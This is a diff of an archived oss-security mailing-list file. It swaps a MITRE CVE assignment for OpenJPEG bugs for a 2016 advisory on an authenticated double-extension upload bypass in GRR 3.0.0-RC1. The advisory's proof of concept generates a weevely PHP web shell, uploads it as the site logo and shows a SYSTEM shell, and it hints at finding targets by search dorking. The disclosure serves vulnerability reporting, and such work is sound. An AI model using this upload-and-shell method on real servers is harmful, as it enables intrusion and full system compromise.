@@ -1,53 +1,127 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/13/2
-Message-Id: <20160513035359.77D777BC065@smtpvmsrv1.mitre.org>
-Date: Thu, 12 May 2016 23:53:59 -0400 (EDT)
-From: cve-assign@...re.org
-To: winsonliu@...cent.com
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE Request - OpenJPEG: Security Fixes
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/12/14
+Message-ID: <CAORzZ6Wt3iMV-WKXO7hxp+GmXVS8PVf_yMpd-Z+dgcEY5LmgzA@mail.gmail.com>
+Date: Tue, 12 Jan 2016 20:03:27 +0100
+From: Jean-Marie Bourbon <mail.bourbon@...il.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: GRR <= 3.0.0-RC1 (all versions) RCE with privilege escalation through file upload filter bypass (authenficated)
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hi guys,
 
-> 1. Issue 774
-> OpenJPEG Heap Buffer Overflow in function color_cmyk_to_rgb of color.c
-> Fixed via https://github.com/uclouvain/openjpeg/commit/162f6199c0cd3ec1c6c6dc65e41b2faab92b2d91
-
-Use CVE-2016-4796.
+I'd like to request a CVE ID for the following security issue.
 
 
-> 3. Issue 733
-> OpenJPEG division-by-zero in function opj_tcd_init_tile of tcd.c
-> Fixed via https://github.com/uclouvain/openjpeg/commit/8f9cc62b3f9a1da9712329ddcedb9750d585505c
+I. APPLICATION
+======================================================================================
 
-Use CVE-2016-4797. Note that the problematic
-"(OPJ_UINT32)-1) / l_data_size" was apparently introduced in a patch
-addressing out-of-bounds read (or heap-based buffer over-read)
-vulnerabilities. See the pdfium.googlesource.com reference in
-CVE-2014-7947. In other words, CVE-2016-4797 exists because of an
-incorrect fix for CVE-2014-7947.
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+GRR is an open source resources manager tool used in many french public
+institutions (not only!).
+It permit for example to manage rooms reservations, and so much more.
 
-iQIcBAEBCAAGBQJXNU9PAAoJEHb/MwWLVhi28X4QAIGR60vQpZzIhEywfDxkjIBR
-dSoym8oeHcYmXJ3ss2YRbh7+SWIstc3gu9cM3BXTuvyIQqsjN0uMf4/GOYanYUe4
-5BtBptTnJlZW+mR+SfZ3Q/ykY3ysTgQMx93114gSj+5+JPS22rb3SM9PiaofeMgh
-1NMGfI91bpp/KotoChumac2ySmA6ozyPXitOhBcu/fYipJAAnymxg0msmXqemjY8
-HC9yjamL5RxvNSl8ljJsB67A7HJ9tvW8zvDUv6w6Q7s6LvbnCdQKJi62gj8/s+u4
-bPP5KlfFdqDSVmQuMbhFwC+g1LfH5wPzjeKo9B2HFZnXPU/MMlHiTLM+Sw2ZPaAK
-y1iZiHJWgoVcgEWRDmBim698GqITbkvkIuIhr/Wwr5JG9VogTmwkEyoHsSUpvybh
-0xtT9po9hyWpli0pzCrEVMOEhg3IIa8l2HY7QK0QwpQgIiOS5FqoDQGx+rE257zX
-ycEjCotU9ut0x9NvuoEZ4Vcij9uuN4LOq936TwbDCL7Mrl2+/sKzUggl9NdiwLOz
-zulrm15VG76PcyrdlBxg5Mz+T3jKnGeASvuIFGvFNAqgDbo1a9aNPsqZqt9PQGms
-tYOD46BI1j04y0lO0+0kzuKM6KQD2I5P481mlxwNkpak8ZbYh2nk+v+sbtE6mQh/
-f76PMrF6mhLea5mECvFK
-=0Yri
------END PGP SIGNATURE-----
+Software Link:
+http://grr.devome.com/fr/telechargement/category/3-versions-patch?download=7:grr-3-0-0-rc1
+
+
+II. ADVISORY
+======================================================================================
+
+
+
+The application allows administrators to change the enterprise's logo
+uploading a new image with .png,.jpg or .gif extension only.
+
+Once uploaded, image name is "splitted" in an array and renamed with the
+name "logo" followed by the extention saved as 2nd array's element.
+
+This file called for example "logo.jpg" is also "chmoded" as 0666
+permission
+and directly accessible in image folder (img_grr by default) by all users.
+
+Besides, the application does only a basic conditional php test
+on the extension of the uploaded file.
+
+It's possible for an attacker to add a second extension that will be
+used when the image will be renamed in order to bypass this basic filter
+(double extension upload filter bypassing).
+
+So, a file called backdoor.php.jpg will be renamed as logo.php with
+chmod 0666 permissions and could be used by attacker to gain more
+privileges
+on the targeted server (privesc due to bad file permissions and RCE).
+
+To trigger this vulnerability it is necessary to have an administrator
+account on the GRR application.
+
+This vulnerability is a combination of 3 issues:
+- predictable uploaded file names and path
+- upload of any kind of file
+- bad files permission when we upload this file that permit us to gain
+privilegied access.
+
+Note that it could be "dorkable" in order to find targets ... and sometimes
+with trivial admin credentials ;-).
+
+
+III. PROOF OF CONCEPT
+======================================================================================
+
+
+Generate backdoor:
+
+    kmkz@...z:~#  weevely generate pass123 /tmp/3lrvs.php
+    Generated backdoor with password 'pass123' in '/tmp/3lrvs.php' of 1486
+byte size.
+    kmkz@...z:~# mv /tmp/3lrvs.php /tmp/3lrvs.php.jpg
+
+
+Login as admin and upload this new 'logo' > Administration > logo
+
+Enjoy your shell!
+
+      kmkz@...z:~# weevely http://laboratoire.target.fr/images/logo.php
+pass123
+    [+] weevely 3.2.0
+
+    [+] Target:    laboratoire.target.fr:F:\server\grr\images
+    [+] Session:    /kmkz/.weevely/sessions/
+laboratoire.target.fr/logo_1.session
+    [+] Shell:    System shell
+
+    [+] Browse the filesystem or execute commands starts the connection
+    [+] to the target. Type :help for more information.
+
+    weevely> whoami
+    autorite nt\system
+
+
+
+IV. RISK
+======================================================================================
+
+By uploading a script, an attacker may be able to execute arbitrary code
+on the server with elevated privileges.
+
+This flaw may compromise the integrity of the system
+(with access to sensitive informations, network shares...) and it may
+conduce
+to  full information system's compromission using pivots techniques and
+imagination!
+
+
+V. VERSIONS AFFECTED
+======================================================================================
+
+GRR 3.0.0-RC1 is vulnerable (and all previous versions)
+
+
+VI. TIMELINE
+======================================================================================
+
+December 17th, 2015: Vulnerability identification
+January 7th, 2016: Vendor and project developers notification
+January 11th, 2016: Project developers response
+
+@kmkz_security
+
